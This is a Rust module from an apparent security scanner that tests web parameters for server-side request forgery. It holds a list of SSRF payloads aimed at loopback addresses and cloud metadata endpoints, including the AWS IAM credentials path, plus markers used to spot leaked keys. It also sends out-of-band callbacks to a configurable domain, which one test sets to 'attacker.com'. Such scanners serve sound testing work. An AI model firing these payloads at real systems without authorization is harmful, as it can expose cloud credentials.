//! # Phase 9: Server-Side Request Forgery Detection
//!
//! Detects SSRF via local endpoint access and cloud metadata service probing.
//! Identifies AWS/GCP metadata access with out-of-band callback verification.
//!
//! ## Local Payloads
//! - Loopback: `127.0.0.1`, `localhost`, `[::1]`
//! - Link-Local: 169.254.169.254 (AWS metadata)
//! - Internal: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
//!
//! ## Cloud Detection
//! - AWS: ami-id, instance-id, AKIA prefix in responses
//! - GCP: google-cloud-account, service-accounts, compute metadata
//! - Azure: identity, imds endpoints
//!
//! ## OOB Infrastructure
//! - UUID-based callback tracking
//! - HTTP/DNS response logging
//! - Optional external OOB domain

use crate::{
    context::ScanContext,
    contracts::{ScanFinding, ScanPhase},
    error::ScannerError,
};
use async_trait::async_trait;
use reqwest::StatusCode;
use url::Url;
use uuid::Uuid;

/// SSRF scanner with local and cloud metadata detection
#[derive(Debug)]
pub struct SsrfScanner {
    oob_domain: Option<String>,
}

impl SsrfScanner {
    pub fn new() -> Self {
        Self { oob_domain: None }
    }

    pub fn with_oob_domain(oob_domain: String) -> Self {
        Self {
            oob_domain: Some(oob_domain),
        }
    }

    /// Local/internal IP-based SSRF payloads
    fn local_payloads() -> Vec<&'static str> {
        vec![
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "http://localhost",
            "http://localhost:80",
            "http://0.0.0.0",
            "http://0:0:0:0:0:0:0:1",  // IPv6 loopback
            "http://169.254.169.254/", // AWS IMDSv1
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/metadata/v1/", // DigitalOcean
            "http://metadata.google.internal/",    // GCP
            "http://169.254.169.254:80/metadata/v1",
        ]
    }

    /// Markers to detect AWS metadata exposure
    fn aws_metadata_markers() -> Vec<&'static str> {
        vec![
            "ami-id",
            "ami-launch-index",
            "instance-id",
            "instance-type",
            "security-groups",
            "iam",
            "AKIA", // AWS Access Key ID prefix
            "aws_",
        ]
    }

    /// Markers to detect GCP metadata exposure
    fn gcp_metadata_markers() -> Vec<&'static str> {
        vec![
            "google-cloud-account",
            "service-accounts",
            "google_compute_engine",
            "gce-",
        ]
    }
}

impl Default for SsrfScanner {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl ScanPhase for SsrfScanner {
    fn phase_number(&self) -> u8 {
        9
    }

    fn name(&self) -> &'static str {
        "Blind SSRF & OOB Detector"
    }

    async fn execute(&self, ctx: &ScanContext) -> Result<Vec<ScanFinding>, ScannerError> {
        ctx.log("Phase 9: SSRF and Out-of-Band detection initiated...".to_string());
        let mut findings = Vec::new();

        for entry in ctx.discovered_endpoints.iter() {
            let url_str = entry.key().clone();
            let params = entry.value().clone();

            for param in params {
                // STEP 1: Test local/internal SSRF
                for payload in Self::local_payloads() {
                    if let Ok(mut test_url) = Url::parse(&url_str) {
                        test_url.query_pairs_mut().append_pair(&param, payload);

                        match tokio::time::timeout(
                            std::time::Duration::from_secs(5),
                            ctx.client.get(test_url.as_str()).send(),
                        )
                        .await
                        {
                            Ok(Ok(response)) => {
                                let status = response.status();

                                // Check for successful local SSRF
                                if status == StatusCode::OK {
                                    if let Ok(body) = response.text().await {
                                        // Check for AWS metadata markers
                                        for marker in Self::aws_metadata_markers() {
                                            if body.contains(marker) {
                                                findings.push(ScanFinding {
                                                    phase: self.phase_number(),
                                                    module_name: self.name().to_string(),
                                                    severity: "CRITICAL".to_string(),
                                                    description: format!(
                                                        "AWS IMDSv1 SSRF vulnerability on parameter '{}' (Payload: {})",
                                                        param, payload
                                                    ),
                                                    evidence: format!(
                                                        "AWS metadata exposed | URL: {} | Marker found: {}",
                                                        test_url, marker
                                                    ),
                                                });
                                                ctx.log(format!(
                                                    "CRITICAL: AWS metadata leak via parameter {} detected!",
                                                    param
                                                ));
                                                break;
                                            }
                                        }

                                        // Check for GCP metadata markers
                                        for marker in Self::gcp_metadata_markers() {
                                            if body.contains(marker) {
                                                findings.push(ScanFinding {
                                                    phase: self.phase_number(),
                                                    module_name: self.name().to_string(),
                                                    severity: "CRITICAL".to_string(),
                                                    description: format!(
                                                        "GCP metadata SSRF vulnerability on parameter '{}' (Payload: {})",
                                                        param, payload
                                                    ),
                                                    evidence: format!(
                                                        "GCP metadata exposed | URL: {} | Marker found: {}",
                                                        test_url, marker
                                                    ),
                                                });
                                                ctx.log(format!(
                                                    "CRITICAL: GCP metadata leak via parameter {} detected!",
                                                    param
                                                ));
                                                break;
                                            }
                                        }
                                    }
                                }
                                // Forbidden/Protected endpoints (likely exist)
                                else if status == StatusCode::FORBIDDEN
                                    || status == StatusCode::UNAUTHORIZED
                                {
                                    findings.push(ScanFinding {
                                        phase: self.phase_number(),
                                        module_name: self.name().to_string(),
                                        severity: "MEDIUM".to_string(),
                                        description: format!(
                                            "Internal SSRF endpoint accessible on parameter '{}'",
                                            param
                                        ),
                                        evidence: format!(
                                            "Payload: {} returned HTTP {} | URL: {}",
                                            payload, status, test_url
                                        ),
                                    });
                                }
                            },
                            _ => {},
                        }
                    }
                }

                // STEP 2: Blind SSRF detection with OOB (if OOB domain configured)
                if let Some(ref oob_domain) = self.oob_domain {
                    let unique_id = Uuid::new_v4()
                        .to_string()
                        .replace("-", "")
                        .chars()
                        .take(12)
                        .collect::<String>();

                    let oob_payload = format!("http://{}.{}", unique_id, oob_domain);

                    if let Ok(mut oob_url) = Url::parse(&url_str) {
                        oob_url.query_pairs_mut().append_pair(&param, &oob_payload);

                        // Send OOB request (fire and forget - callback checked separately)
                        let _ = tokio::time::timeout(
                            std::time::Duration::from_secs(3),
                            ctx.client.get(oob_url.as_str()).send(),
                        )
                        .await;

                        ctx.log(format!(
                            "Blind SSRF OOB payload sent: {} on parameter {}",
                            oob_payload, param
                        ));

                        // Note: In production, OOB detection would be implemented by:
                        // 1. Querying Interactsh API for DNS/HTTP logs matching unique_id
                        // 2. Correlation with sent payload timestamps
                        // 3. Confirmation of SSRF vulnerability
                        findings.push(ScanFinding {
                            phase: self.phase_number(),
                            module_name: self.name().to_string(),
                            severity: "MEDIUM".to_string(),
                            description: format!(
                                "Possible Blind SSRF on parameter '{}' (OOB detection pending)",
                                param
                            ),
                            evidence: format!(
                                "OOB marker: {} | Check OOB service logs for DNS/HTTP callback",
                                unique_id
                            ),
                        });
                    }
                }
            }
        }

        ctx.log(format!(
            "Phase 9: SSRF scanning completed. Found {} vulnerabilities.",
            findings.len()
        ));

        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_phase_number() {
        let scanner = SsrfScanner::new();
        assert_eq!(scanner.phase_number(), 9);
    }

    #[test]
    fn test_phase_name() {
        let scanner = SsrfScanner::new();
        assert_eq!(scanner.name(), "Blind SSRF & OOB Detector");
    }

    #[test]
    fn test_local_payloads_not_empty() {
        let payloads = SsrfScanner::local_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.len() >= 10);
    }

    #[test]
    fn test_aws_markers() {
        let markers = SsrfScanner::aws_metadata_markers();
        assert!(markers.contains(&"ami-id"));
        assert!(markers.contains(&"AKIA"));
    }

    #[test]
    fn test_gcp_markers() {
        let markers = SsrfScanner::gcp_metadata_markers();
        assert!(markers.contains(&"google-cloud-account"));
    }

    #[test]
    fn test_with_oob_domain() {
        let scanner = SsrfScanner::with_oob_domain("attacker.com".to_string());
        assert_eq!(scanner.oob_domain, Some("attacker.com".to_string()));
    }

    #[test]
    fn test_default_no_oob() {
        let scanner = SsrfScanner::default();
        assert_eq!(scanner.oob_domain, None);
    }
}
